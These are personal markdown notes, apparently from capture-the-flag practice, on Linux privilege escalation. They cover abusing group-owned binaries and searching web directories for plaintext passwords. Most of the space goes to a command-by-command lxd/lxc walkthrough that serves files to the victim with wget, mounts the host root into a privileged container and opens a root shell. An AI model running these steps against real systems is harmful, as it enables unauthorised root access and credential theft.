# Linux Privesc 
﷽
* Guide / methodology on linux privesc.

## Groups exploitation
* Find groups the user is part of with the `id` command
* Try to find binaries in that group:
  * `find / -group {group-name} 2>/dev/null`
* If there are binaries, check the privileges of them and what type of file it is:
  * `ls -la {filename} && file {filename}`
* In my case, there was a `suid` set on that binary, which is a promising exploitation path (head over to `suid.md` for a guide :)
### `lxd`/`lxc` group exploit
[ref](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.html#lxdlxc-group---privilege-escalation)
* `LXD` is a management API for dealing with `LXC` containers on Linux systems.
* A member of the local `lxd` group ***can instantly privesc to root*** on the host OS.
  * This is irrespective of whether the user has been granted `sudo` rights and there is no password prompt.
#### how it works
* Check if you’re in the lxd group:
  * If yes, you can control LXD and create containers.
* Launch a container (Alpine Linux) using LXD:
  * Think of this like booting up a mini-computer.
* Mount the host’s root filesystem (/) into the container:
  * Using LXD features, tell it: “Hey, give this container access to the host's actual files!”
* Inside the container, you now have access to the host filesystem:
  * You can go into /mnt/root/ (or whatever you mount it as) and access real host files like /etc/shadow, /root/.ssh/, etc.
* Now you can add a new root user, overwrite passwords, or drop in SSH keys.
  * Since you're inside and the host filesystem is mounted, you can change files on the host.
* Exit the container, login as root (or with your new user), and boom: you’re root on the host.
#### guide
* as `LXC` is a container thingy like `docker` we will use a lightweight image.
* alpine linux is good for this :)

* firstly, download the pre-built alpine linux image off the [`lxc` containers repo.](https://images.lxd.canonical.com/)
* use the latest image with the right architecture.
* download the two required files:
  * `lxd.tar.xz` – Contains metadata and configuration for the LXC/LXD image.
  * `rootfs.squashfs` – Contains the root filesystem of the Alpine image.
* now, host the files on your computer for download on victim:
  * `python3 -m http.server 8000`
* get the files on victim's computer:
  * `wget http://{ip}:8000/lxd.tar.xz`
  * `wget http://{ip}:8000/root.squashfs`
* `ls -la` to ensure they have successfully been uploaded.
* now, import the image using the LXC CLI tool:
  * `lxc image import lxd.tar.xz rootfs.squashfs --alias alpine`
* verify with `lxc image list`
* *now, set the `security.privileged` flag to `true` so the container has the same privileges as `root`:*
  * `lxc init alpine privesc -c security.privileged=true`
* *mount the root file system in the container on the `/mnt`:*
  * `lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true`
* ***now, start the container and issue a shell within :)***
  * `lxc start privesc`
  * `lxc exec privesc /bin/sh`
* in my case, the flag was in `/mnt/root/root`.

## PHP/SQL servers, and their plaintext passwords.
* Navigate to `/var/www/html`
  * `cd /var/www/html`
* `cat *` and look for plaintext credentials
## sudo exploits.
* list the sudo privileges our user is assigned with `sudo -l`.
* it is rarely a good idea to let a user run a binary as `sudo`. this is because default binaries on linux often contain parameters that when passed through, can run commands as root.
* https://gtfobins.github.io/ is an amazing website for this.

